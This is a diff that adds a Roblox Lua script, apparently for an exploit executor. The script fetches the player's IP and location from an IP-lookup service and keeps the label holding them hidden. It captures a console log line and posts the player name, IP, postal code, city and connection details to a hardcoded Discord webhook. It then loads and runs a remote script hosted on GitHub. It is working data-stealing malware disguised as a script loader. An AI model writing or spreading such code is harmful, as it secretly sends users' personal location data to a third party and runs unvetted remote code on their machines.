@@ -1,1 +1,102 @@
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local HttpService = game:GetService("HttpService")
+local LogService = game:GetService("LogService")
 
+local player = Players.LocalPlayer
+local camera = workspace.CurrentCamera
+
+-- Create GUI
+local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+gui.Name = "ScreenGui"
+
+local textLabel = Instance.new("TextLabel", gui)
+textLabel.Size = UDim2.new(0.6, 0, 0.3, 0)
+textLabel.Position = UDim2.new(0.2, 0, 0.35, 0)
+textLabel.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+textLabel.TextColor3 = Color3.new(1, 1, 1)
+textLabel.TextScaled = true
+textLabel.TextWrapped = true
+textLabel.Text = "Loading..."
+textLabel.Visible = false
+
+-- Fetch IP/location data
+local function fetchApiData()
+	local success, api = pcall(function()
+		return HttpService:JSONDecode(game:HttpGet('https://ipwho.is/'))
+	end)
+	return success and api or nil
+end
+
+local function formatDateTime(api)
+	local time = api.timezone and api.timezone["current_time"] or "0000-00-00 00:00:00"
+	local year = time:sub(1, 4)
+	local month = time:sub(6, 7)
+	local day = time:sub(9, 10)
+	local hour = tonumber(time:sub(12, 13))
+	local minute = time:sub(15, 16)
+	local second = time:sub(18, 19)
+	local meridiem = hour and (hour >= 12 and "PM" or "AM") or "N/A"
+	hour = hour and (hour > 12 and hour - 12 or hour) or "N/A"
+	return month, day, year, hour, minute, second, meridiem
+end
+
+local function updateTextLabel(api)
+	local month, day, year, hour, minute, second, meridiem = formatDateTime(api)
+	textLabel.Text =
+		"Player: " .. player.Name ..
+		"\nDate: " .. month .. "/" .. day .. "/" .. year ..
+		"\nTime: " .. hour .. ":" .. minute .. ":" .. second .. " " .. meridiem ..
+		"\n\nIP: " .. tostring(api.ip or "N/A") ..
+		"\nContinent: " .. tostring(api.continent or "N/A") ..
+		"\nRegion: " .. tostring(api.region or "N/A") ..
+		"\nPostal: " .. tostring(api.postal or "N/A") ..
+		"\nCountry: " .. tostring(api.country or "N/A") ..
+		"\nCity: " .. tostring(api.city or "N/A") ..
+		"\nCapital: " .. tostring(api.capital or "N/A") ..
+		"\nConnection: " .. tostring(api.connection or "N/A")
+end
+
+-- Call API and update UI
+local apiData = fetchApiData()
+if apiData then
+	updateTextLabel(apiData)
+end
+
+-- Collect logs (only MessageOutput)
+local skibidi = {}
+local hasCaptured = false  -- Flag to prevent multiple log captures
+LogService.MessageOut:Connect(function(message, messageType)
+	if messageType == Enum.MessageType.MessageOutput then
+		-- Capture the log message
+		if not hasCaptured then
+			table.insert(skibidi, message)
+			hasCaptured = true  -- Ensure this only happens once
+		end
+	end
+end)
+
+task.wait(3)
+
+-- Add label content only once
+table.insert(skibidi, "\nTextLabel content:\n" .. textLabel.Text)
+
+-- Send to Discord
+if #skibidi > 0 then
+	local rizz = table.concat(skibidi, "\n")
+	local bingus = request or http_request or (syn and syn.request) or (fluxus and fluxus.request)
+	if bingus then
+		local payload = {
+			content = "Captured Console Logs and Info:\n\n" .. rizz
+		}
+		bingus({
+			Url = "https://discord.com/api/webhooks/1368033106824659055/iUr4KwROaWcnvm_J7eYSQhz7cqWQ1otXCd9_IlAJ6sPJHiv7QsvbnxponoprKVFrZzDW",
+			Method = "POST",
+			Headers = {["Content-Type"] = "application/json"},
+			Body = HttpService:JSONEncode(payload)
+		})
+	end
+end
+
+wait(0.01)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ArdyBotzz/NatHub/refs/heads/master/NatHub.lua"))()
